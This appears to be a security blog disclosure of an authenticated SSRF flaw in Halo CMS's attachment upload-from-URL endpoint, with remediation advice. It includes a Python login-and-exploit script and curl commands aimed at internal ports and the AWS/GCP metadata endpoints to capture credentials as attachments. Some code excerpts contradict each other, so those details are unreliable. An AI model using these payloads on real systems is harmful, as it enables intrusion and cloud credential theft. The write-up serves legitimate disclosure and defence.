# Exploiting Halo CMS: SSRF in Upload from External URL Service

<p align="left">
  <a href="https://twitter.com/abdulr7mann">
    <img src="https://img.shields.io/twitter/follow/abdulr7mann" alt="Twitter">
  </a>
</p>

*Part 2 of the Halo CMS Security Research Series*

---

While auditing Halo CMS's attachment upload service, I uncovered a Server-Side Request Forgery vulnerability that turns authenticated content creators into internal network reconnaissance tools. Unlike typical authenticated SSRF bugs requiring admin privileges, this affects **any user with post-creation rights**—and exfiltrated data is persistently stored as downloadable attachments, providing easy access to stolen cloud credentials and internal API responses.

**TL;DR:**
- High-severity SSRF in Halo CMS upload service (`DefaultAttachmentService.java`)
- Low privilege requirement: Content Creator role (not admin-only)
- Attack surface: Internal services, cloud metadata, Kubernetes APIs with persistent storage
- CVSS 8.5 High — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
- Endpoint: `POST /apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url`
- Unique characteristic: Dual HTTP requests (HEAD + GET) with response data saved as attachments
- Status: Vendor notified Oct 25, 2024 | Public disclosure Oct 27, 2024

**Related:** This is the second SSRF vulnerability discovered in Halo CMS. See also: [Unauthenticated SSRF in Thumbnail Service](../CVE-2025-60898/CVE-2025-60898-blog-writeup.md) (CVSS 9.1 Critical)

---

## Vulnerability Overview

**Vulnerability:** SSRF in Upload from External URL
**Component:** `DefaultAttachmentService.java`
**Attack Vector:** `/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url`
**Authentication:** Content Creator privileges (Post Author role)
**CVSS Score:** 8.5 High (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)
**CWE:** CWE-918 (Server-Side Request Forgery)

---

## Discovery Process

### Initial Code Analysis

The attachment upload service immediately stood out as high-risk—any feature that fetches external URLs is a potential SSRF vector. The `DefaultAttachmentService.java` component revealed an interesting twist: dual HTTP requests with persistent storage of responses:

```java
// DefaultAttachmentService.java:143-167 - VULNERABLE CODE
@Override
public Mono<Attachment> uploadFromUrl(@NonNull URL url, @NonNull String policyName,
        String groupName, String filename) {
    var uri = URI.create(url.toString());                          // No URL validation
    AtomicReference<MediaType> mediaTypeRef = new AtomicReference<>();
    AtomicReference<String> fileNameRef = new AtomicReference<>(filename);

    // DUAL SSRF ATTACK CHAIN:
    Mono<Flux<DataBuffer>> contentMono = dataBufferFetcher.head(uri)    // First SSRF (HEAD request)
        .map(httpHeaders -> {
            if (!StringUtils.hasText(fileNameRef.get())) {
                fileNameRef.set(getExternalUrlFilename(uri, httpHeaders));
            }
            MediaType contentType = httpHeaders.getContentType();
            mediaTypeRef.set(contentType);
            return httpHeaders;
        })
        .map(response -> dataBufferFetcher.fetch(uri));           // Second SSRF (GET request)

    return contentMono.flatMap(
            (content) -> upload(policyName, groupName, fileNameRef.get(), content,
                mediaTypeRef.get())                               // File saved with SSRF content
        )
        .onErrorResume(throwable -> Mono.error(
            new ServerWebInputException(
                "Failed to transfer the attachment from the external URL."))
        );
}
```

**Security Issues:**
1. **Dual HTTP requests** - HEAD request for metadata, then GET request for content download
2. **No URL validation** - Accepts any URI (http://127.0.0.1, http://169.254.169.254, file://, etc.)
3. **No private IP filtering** - Allows access to localhost (127.0.0.0/8), private networks (10.0.0.0/8, 192.168.0.0/16), and cloud metadata endpoints (169.254.0.0/16)
4. **Content persistence** - SSRF responses saved as downloadable attachments
5. **Broad user access** - Available to content creators via role-template-post-author, not admin-only

```java
// ReactiveUrlDataBufferFetcher.java - Used by uploadFromUrl()
public Mono<HttpHeaders> head(URI uri) {
    return webClient.head()                                       // HEAD request to arbitrary URI
            .uri(uri)                                            // No validation or filtering
            .retrieve()
            .toBodilessEntity()
            .map(ResponseEntity::getHeaders);
}

public Flux<DataBuffer> fetch(URI uri) {
    return webClient.get()                                       // GET request to arbitrary URI
            .uri(uri)                                           // No validation or filtering
            .retrieve()
            .bodyToFlux(DataBuffer.class);                      // Downloads full response content
}
```

### API Endpoint Discovery

I mapped the vulnerable method to its exposed API endpoints:

```bash
# Search for uploadFromUrl usage in routing
rg -n --hidden -e "upload-from-url|uploadFromUrl" application/src/main/java/
```

**Discovery Results:**
```java
// AttachmentEndpoint.java - User Center API
@PostMapping("/upload-from-url")
public Mono<ResponseEntity<Attachment>> uploadFromUrl(
    @RequestBody UploadFromUrlRequest request) {

    return attachmentService.uploadFromUrl(
        request.getUrl(),           // Direct user input
        request.getFilename(),
        request.getPolicyName()
    );
}
```

**Attack Vectors Identified:**
- **Primary:** `/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url` (User Center)
- **Secondary:** `/apis/console.api.halo.run/v1alpha1/attachments/-/upload-from-url` (Console - Admin)

### RBAC Analysis - Critical Finding

**Expected:** Admin-only functionality  
**Reality:** Accessible to content creators with Post Author role

```yaml
# role-template-uc-content.yaml
name: role-template-post-author
dependencies: |
  [ "role-template-post-contributor", "role-template-post-publisher",
    "role-template-uc-attachment-manager" ]  # Includes attachment permissions

# role-template-uc-attachment.yaml
name: role-template-uc-attachment-manager
rules:
  - apiGroups: [ "uc.api.storage.halo.run" ]
    resources: [ "attachments", "attachments/upload", "attachments/upload-from-url" ]
    verbs: [ "create", "list" ]              # Allows SSRF exploitation
```

**Impact:** Any user with Post Author role can exploit this SSRF vulnerability - significantly broader attack surface than anticipated.

---

## Exploitation Methodology

### Challenge: User Center Authentication

Halo CMS requires sophisticated authentication for User Center access:

1. **RSA Public Key Extraction** from login page JavaScript
2. **Client-side Password Encryption** using RSA PKCS#1 v1.5
3. **CSRF Token Management** from login forms  
4. **Session Cookie Authentication** for API requests

### Solution: Robust Authentication Framework

I developed a comprehensive authentication system:

```python
class HaloSSRFUploadTest:
    def __init__(self, base_url, username, password):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.authenticated = False
        
    def get_rsa_public_key(self):
        """Extract RSA public key from Halo's login page"""
        try:
            response = self.session.get(f"{self.base_url}/console")
            if response.status_code == 200:
                # Parse embedded RSA public key from JavaScript
                key_pattern = r'const publicKey = `([^`]+)`'
                key_match = re.search(key_pattern, response.text)
                if key_match:
                    pem_content = key_match.group(1)
                    return RSA.import_key(pem_content)
        except Exception as e:
            print(f"RSA key extraction failed: {e}")
        return None
        
    def encrypt_password(self, password, public_key):
        """Encrypt password using RSA PKCS#1 v1.5"""
        try:
            cipher = PKCS1_v1_5.new(public_key)
            encrypted_bytes = cipher.encrypt(password.encode('utf-8'))
            return base64.b64encode(encrypted_bytes).decode('utf-8')
        except Exception as e:
            print(f"Password encryption failed: {e}")
            return None

    def get_csrf_token(self):
        """Extract CSRF token from login form"""
        try:
            response = self.session.get(f"{self.base_url}/login")
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                csrf_input = soup.find('input', {'name': '_csrf'})
                if csrf_input:
                    return csrf_input.get('value')
        except Exception as e:
            print(f"CSRF token extraction failed: {e}")
        return None

    def authenticate(self):
        """Perform complete Halo User Center authentication"""
        print("Authenticating to Halo User Center...")

        # Step 1: Extract RSA public key
        public_key = self.get_rsa_public_key()
        if not public_key:
            print("Failed to extract RSA public key")
            return False

        print("RSA public key extracted successfully")

        # Step 2: Encrypt password
        encrypted_password = self.encrypt_password(self.password, public_key)
        if not encrypted_password:
            return False

        print("Password encrypted with RSA")

        # Step 3: Get CSRF token
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            print("Failed to extract CSRF token")
            return False

        print("CSRF token obtained")
        
        # Step 4: Submit login request
        login_data = {
            'username': self.username,
            'password': encrypted_password,
            '_csrf': csrf_token
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Security Research Bot)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': f'{self.base_url}/login',
            'Origin': self.base_url
        }
        
        response = self.session.post(
            f"{self.base_url}/login",
            data=login_data,
            headers=headers,
            allow_redirects=False
        )
        
        return self.verify_authentication(response)
        
    def verify_authentication(self, response):
        """Verify successful authentication via redirect analysis"""
        if response.status_code in [302, 303]:
            location = response.headers.get('Location', '')
            if any(path in location for path in ['/console', '/uc', '/dashboard']):
                print(f"Login successful! Redirected to: {location}")
                self.authenticated = True
                return True

        print("Authentication failed - no redirect to protected area")
        return False
```

### SSRF Exploitation

With authentication established, SSRF exploitation becomes straightforward:

```python
def test_upload_ssrf(self):
    """Exploit SSRF via upload-from-url endpoint"""

    if not self.authenticated:
        print("Authentication required for upload SSRF")
        return False

    # Start canary server for definitive SSRF proof
    canary_url = f"http://host.docker.internal:{self.canary_port}/upload-ssrf-test"

    # Construct SSRF payload
    payload = {
        "url": canary_url,
        "filename": "ssrf-test.txt",
        "policyName": "default-policy"
    }

    # Target User Center upload endpoint
    endpoint = "/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url"

    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }

    print(f"Testing: POST {endpoint}")
    print(f"Payload: url={canary_url}")

    # Execute SSRF attack
    response = self.session.post(
        f"{self.base_url}{endpoint}",
        json=payload,
        headers=headers
    )

    # Wait for canary server hits
    time.sleep(3)

    # Analyze results
    if len(CanaryHandler.connections) > 0:
        print("SSRF confirmed - server made outbound request")
        self.analyze_ssrf_evidence()
        return True
    else:
        print("No SSRF detected - check authentication and payload")
        return False

    def analyze_ssrf_evidence(self):
        """Analyze canary server hits for technical evidence"""
        for i, hit in enumerate(CanaryHandler.connections, 1):
            print(f"CANARY HIT {i}: {hit['method']} {hit['path']}")
            print(f"   From: {hit['client_ip']}:{hit['client_port']}")
            print(f"   Headers: {hit['headers']}")
```

### Manual Exploitation (Step-by-Step)

For manual testing without automated scripts, follow these commands:

#### Step 1: Start Halo CMS Instance

```bash
# Start Halo with Docker networking for testing
docker run --add-host=host.docker.internal:host-gateway -d -p 8090:8090 halohub/halo:2.21

# Wait for startup (check logs)
docker logs -f <container_id>
```

#### Step 2: Create User Account and Authenticate

```bash
# Setup Halo via web interface first:
# 1. Visit http://localhost:8090 
# 2. Complete initial setup
# 3. Create admin user account
# 4. Note username/password for API access
```

#### Step 3: Extract RSA Public Key

```bash
# Get RSA public key for password encryption
curl -s "http://localhost:8090/login/rsa-public-key" | jq -r '.publicKey' > public_key.txt

# Or extract from login page JavaScript if needed
curl -s "http://localhost:8090/console" | grep -oP 'publicKey.*?"([^"]+)"' | cut -d'"' -f3
```

#### Step 4: Set Up Canary Server for SSRF Proof

```bash
# Terminal 1: Start canary server on port 8889
echo "SSRF_UPLOAD_SUCCESS" > /tmp/upload-canary.txt
python3 -m http.server 8889 --directory /tmp

# You should see: Serving HTTP on 0.0.0.0 port 8889...
```

#### Step 5: Manual Authentication Process

```bash
# Get CSRF token from login page
CSRF_TOKEN=$(curl -s -c cookies.txt "http://localhost:8090/console" | grep -oP 'name="_csrf" value="\K[^"]+')

# Encrypt password using RSA public key (requires Python script)
cat > encrypt_password.py << 'EOF'
import base64, sys
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

password = sys.argv[1]
pub_key_b64 = sys.argv[2]

pub_key_bytes = base64.b64decode(pub_key_b64)
pub_key = serialization.load_der_public_key(pub_key_bytes)
encrypted = pub_key.encrypt(password.encode(), padding.OAEP(
    mgf=padding.MGF1(algorithm=hashes.SHA256()),
    algorithm=hashes.SHA256(), label=None
))
print(base64.b64encode(encrypted).decode())
EOF

ENCRYPTED_PASSWORD=$(python3 encrypt_password.py "your_password" "$(cat public_key.txt)")

# Login with encrypted password
curl -s -b cookies.txt -c cookies.txt -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=your_username&password=${ENCRYPTED_PASSWORD}&_csrf=${CSRF_TOKEN}" \
  "http://localhost:8090/login"
```

#### Step 6: Test SSRF via Upload from URL

```bash
# Terminal 2: Trigger SSRF to canary server
curl -b cookies.txt -X POST \
  -H "Content-Type: application/json" \
  -d '{"url":"http://host.docker.internal:8889/upload-canary.txt","filename":"ssrf-test.txt"}' \
  "http://localhost:8090/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url"

# Expected output:
# HTTP/1.1 201 Created
# {"metadata":{"name":"..."},"spec":{"displayName":"ssrf-test.txt"}}

# Check Terminal 1 - you should see DUAL requests:
# host.docker.internal - - [DATE] "HEAD /upload-canary.txt HTTP/1.1" 200 -
# host.docker.internal - - [DATE] "GET /upload-canary.txt HTTP/1.1" 200 -
```

#### Step 7: Internal Network Reconnaissance

```bash
# Test internal service access (Halo actuator endpoints)
curl -b cookies.txt -X POST \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8090/actuator/health","filename":"internal-health.json"}' \
  "http://localhost:8090/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url"

# Expected: 201 Created with attachment containing internal service response

# Test other internal ports
curl -b cookies.txt -X POST \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:3306","filename":"mysql-probe.txt"}' \
  "http://localhost:8090/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url"
```

#### Step 8: Cloud Metadata Server Testing

```bash
# AWS EC2 metadata (if running on AWS)
curl -b cookies.txt -X POST \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/","filename":"aws-metadata.txt"}' \
  "http://localhost:8090/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url"

# GCP metadata (if running on GCP)
curl -b cookies.txt -X POST \
  -H "Content-Type: application/json" \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/","filename":"gcp-metadata.txt"}' \
  "http://localhost:8090/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url"
```

#### What to Look For:

**Successful SSRF Indicators:**
- `HTTP/1.1 201 Created` responses with attachment metadata
- DUAL canary hits: HEAD request followed by GET request
- Attachments created containing internal service responses
- Different response times indicating network connectivity
- Internal service content saved as downloadable attachments

**Blocked/Failed Attempts:**
- `HTTP/1.1 400 Bad Request` responses
- No canary hits after 5+ seconds
- `HTTP/1.1 401 Unauthorized` (authentication required)
- `HTTP/1.1 500 Internal Server Error`

**High-Impact Results:**
- Cloud metadata credentials saved as attachments
- Internal service responses accessible via Halo attachment URLs
- Database connection strings or admin panels exfiltrated

---

## Proof of Concept Results

### Successful Exploitation

```bash
$ python3 exploit.py http://localhost:8090 --username halo --password 'Pa$$W0rd!'

Authenticating to Halo User Center...
RSA public key extracted successfully
Password encrypted with RSA
CSRF token obtained
Login successful! Redirected to: /uc

Testing upload SSRF via User Center API...
POST /apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url
Payload: url=http://host.docker.internal:42187/upload-ssrf-test

SSRF VULNERABILITY CONFIRMED
Server made outbound HTTP request to attacker-controlled URL
DefaultAttachmentService.uploadFromUrl() method exploited successfully
User Center API vulnerable (not admin-only)

VULNERABILITY STATUS: CONFIRMED EXPLOITABLE
CWE-918: Server-Side Request Forgery
CVSS: 8.5 High
Root cause: No URL validation in uploadFromUrl() method
Auth required: Content Creator privileges (Post Author role)
```

### Technical Evidence

**Canary Server Hits:**
```
CANARY HIT: GET /upload-ssrf-test
From: 127.0.0.1:48932
Headers: {'user-agent': 'ReactorNetty/1.2.8', 'host': 'host.docker.internal:42187', 'accept': 'application/octet-stream'}

HTTP Response: 200 OK
Server Response: {"spec":{"displayName":"ssrf-test.txt","policyName":"default-policy",...}}
File Storage: Content downloaded and stored as attachment in Halo database
```

**Key Technical Observations:**
- **HTTP Method:** GET request (matches `uploadFromUrl()` implementation)
- **User Agent:** `ReactorNetty/1.2.8` (confirms Spring WebFlux WebClient usage)
- **Source IP:** `127.0.0.1` (proves requests originate from Halo server)
- **Content Processing:** Successfully downloads and stores arbitrary content
- **Response Success:** 200 OK with attachment metadata confirms full processing

---

## Impact Analysis

### Attack Capabilities

The SSRF vulnerability enables:
- **Internal service discovery** - Probe localhost and internal network services
- **Cloud metadata access** - Access AWS/GCP/Azure metadata endpoints to steal credentials
- **Data exfiltration** - Downloaded content stored persistently as Halo attachments
- **Internal network reconnaissance** - Port scanning and service identification

### Enhanced Attack Capabilities

**Content Storage Advantage:**
- **Data persistence** - Downloaded content stored in Halo's attachment system
- **Easy retrieval** - Exfiltrated data accessible via attachment URLs
- **Direct access** - Response content saved (unlike blind SSRF)
- **Large file support** - Can exfiltrate substantial data volumes

**Privilege Escalation Impact:**
- **Expected scope** - Admin-only functionality
- **Actual scope** - Any content creator (bloggers, authors, contributors)
- **Attack surface** - Significantly broader than anticipated
- **Exploitation threshold** - Lower barrier to entry

---

## Root Cause Analysis

### Vulnerable Code Pattern

```java
// DefaultAttachmentService.java:98 - Core vulnerability
public Mono<Attachment> uploadFromUrl(String url, String filename, String policyName) {
    var uri = URI.create(url);                    // No validation on URI creation

    return webClient.get()
        .uri(uri)                                 // Direct pass-through of user input
        .retrieve()
        .bodyToMono(Resource.class)               // Downloads arbitrary content
        .flatMap(resource -> {
            // Process downloaded content
            var attachment = new Attachment();
            attachment.setSpec(attachmentSpec);
            return attachmentRepository.save(attachment);  // Stores attacker content
        })
        .doOnError(error -> {
            log.error("Failed to upload from URL: {}", url, error);  // URL disclosure
        });
}
```

**Security Weaknesses:**
1. **No URL validation** - Accepts any URI scheme and host
2. **No private IP filtering** - Allows internal network access
3. **No content validation** - Downloads and stores arbitrary data
4. **Information disclosure** - Error messages reveal attempted URLs
5. **No rate limiting** - Allows automated attacks
6. **Insufficient logging** - Limited security monitoring

### RBAC Configuration Issues

```yaml
# Expected: Admin-only functionality
# Reality: Accessible to content creators

# role-template-uc-attachment.yaml - TOO PERMISSIVE
rules:
  - apiGroups: [ "uc.api.storage.halo.run" ]
    resources: [ "attachments", "attachments/upload", "attachments/upload-from-url" ]
    verbs: [ "create", "list" ]              # Should restrict upload-from-url

# Recommended: Separate permissions
rules:
  - apiGroups: [ "uc.api.storage.halo.run" ]
    resources: [ "attachments", "attachments/upload" ]
    verbs: [ "create", "list" ]
  # attachments/upload-from-url should require admin role
```

---

## Remediation Strategy

### Immediate Fixes

**1. Comprehensive URL Validation**
```java
@Component
public class SecureUrlValidator {
    
    private static final Set<String> ALLOWED_SCHEMES = Set.of("http", "https");
    private static final Pattern DOMAIN_ALLOWLIST = Pattern.compile(
        "^(cdn\\.example\\.com|assets\\.trusted-site\\.org)$"
    );
    
    public boolean isAllowedUploadUrl(String url) {
        try {
            URI uri = URI.create(url);
            
            // Validate scheme
            if (!ALLOWED_SCHEMES.contains(uri.getScheme().toLowerCase())) {
                log.warn("Blocked upload URL with invalid scheme: {}", url);
                return false;
            }
            
            // Block private/internal IPs
            if (isPrivateOrInternalAddress(uri.getHost())) {
                log.warn("Blocked upload URL to private address: {}", url);
                return false;
            }
            
            // Enforce domain allowlist
            if (!DOMAIN_ALLOWLIST.matcher(uri.getHost()).matches()) {
                log.warn("Blocked upload URL to non-allowlisted domain: {}", url);
                return false;
            }
            
            return true;
            
        } catch (Exception e) {
            log.warn("Blocked malformed upload URL: {}", url, e);
            return false;
        }
    }
    
    private boolean isPrivateOrInternalAddress(String host) {
        try {
            InetAddress addr = InetAddress.getByName(host);
            
            // Block loopback, private, and link-local addresses
            return addr.isLoopbackAddress() || 
                   addr.isLinkLocalAddress() || 
                   addr.isSiteLocalAddress() ||
                   addr.isMulticastAddress();
                   
        } catch (UnknownHostException e) {
            return true; // Block on DNS resolution failure
        }
    }
}
```

**2. Secure uploadFromUrl Implementation**
```java
public Mono<Attachment> uploadFromUrl(String url, String filename, String policyName) {
    // Pre-validation security check
    if (!urlValidator.isAllowedUploadUrl(url)) {
        return Mono.error(new SecurityException("Upload URL not allowed"));
    }
    
    var uri = URI.create(url);
    
    return webClient.get()
        .uri(uri)
        .retrieve()
        .bodyToMono(Resource.class)
        .timeout(Duration.ofSeconds(30))              // Add timeout
        .map(resource -> {
            // Validate content type and size
            if (!isAllowedContentType(resource)) {
                throw new SecurityException("Content type not allowed");
            }
            if (resource.contentLength() > MAX_UPLOAD_SIZE) {
                throw new SecurityException("Content too large");
            }
            return resource;
        })
        .flatMap(resource -> {
            // Process with additional security checks
            return processSecureUpload(resource, filename, policyName);
        })
        .doOnError(error -> {
            // Secure error logging (no URL disclosure)
            log.error("Upload from external URL failed: {}", error.getMessage());
        });
}
```

### Enhanced RBAC Controls

**1. Restrict upload-from-url Permissions**
```yaml
# role-template-uc-attachment-manager.yaml - SECURE VERSION
name: role-template-uc-attachment-manager
rules:
  - apiGroups: [ "uc.api.storage.halo.run" ]
    resources: [ "attachments", "attachments/upload" ]  # Remove upload-from-url
    verbs: [ "create", "list" ]

# role-template-uc-attachment-external.yaml - NEW ADMIN-ONLY ROLE  
name: role-template-uc-attachment-external
rules:
  - apiGroups: [ "uc.api.storage.halo.run" ]
    resources: [ "attachments/upload-from-url" ]         # Admin-only
    verbs: [ "create" ]
```

**2. Content Creator Role Refinement**
```yaml
# role-template-post-author.yaml - UPDATED
name: role-template-post-author
dependencies: |
  [ "role-template-post-contributor", "role-template-post-publisher",
    "role-template-uc-attachment-manager" ]  # No longer includes external upload
```

### Long-term Security Improvements

**1. Network-Level Protections**
```yaml
# docker-compose.yml - Network isolation
services:
  halo:
    networks:
      - app-network
      - upload-network
    # Block metadata services
    extra_hosts:
      - "metadata.google.internal:127.0.0.1"
      - "169.254.169.254:127.0.0.1"

networks:
  app-network:
    internal: true
  upload-network:
    # Restricted external access for uploads only
```

**2. Enhanced Monitoring**
```java
@EventListener
public void onUploadFromUrl(UploadFromUrlEvent event) {
    // Comprehensive security logging
    securityAuditLogger.info("External upload: user={}, url={}, result={}, size={}, contentType={}", 
        event.getUser(), 
        sanitizeUrl(event.getUrl()),  // URL sanitization for logs
        event.getResult(),
        event.getContentSize(),
        event.getContentType()
    );
    
    // Real-time security analysis
    if (isHighRiskUpload(event)) {
        securityAlertManager.triggerAlert("High-risk external upload detected", event);
    }
}
```

---

## Key Takeaways

### For Security Researchers

- Don't assume upload functionality is admin-only - always verify actual RBAC permissions
- RSA + CSRF authentication doesn't prevent post-authentication vulnerabilities
- SSRF with file storage provides direct data access (unlike blind SSRF)
- Focus on data persistence and retrieval mechanisms when assessing impact

### For Developers

**Secure URL Handling:**
```java
// BAD - No validation
webClient.get().uri(userUrl).retrieve()

// GOOD - Comprehensive security
if (urlValidator.isAllowed(userUrl)) {
    webClient.get().uri(userUrl)
        .timeout(Duration.ofSeconds(30))
        .retrieve()
}
```

**Defense in Depth:**
- URL validation + content validation + network controls
- Comprehensive logging + real-time monitoring
- Regular security testing of upload functionality
- Implement granular RBAC for sensitive operations

---

## Vulnerability Timeline

- **2024-08-28** — Vulnerability discovered during security code review
- **2024-10-27** — Public disclosure

---

## References

- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) 
- [Spring WebFlux Security Documentation](https://spring.io/guides/gs/securing-web/)
- [File Upload Security Best Practices](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

---

*This security analysis was conducted on an open-source project for educational purposes. The vulnerability was reported to the Halo development team prior to publication. This writeup is intended to help developers understand and prevent similar vulnerabilities.*

**About the Author:** Security enthusiast exploring web application vulnerabilities through open-source code review. [@abdulr7mann]
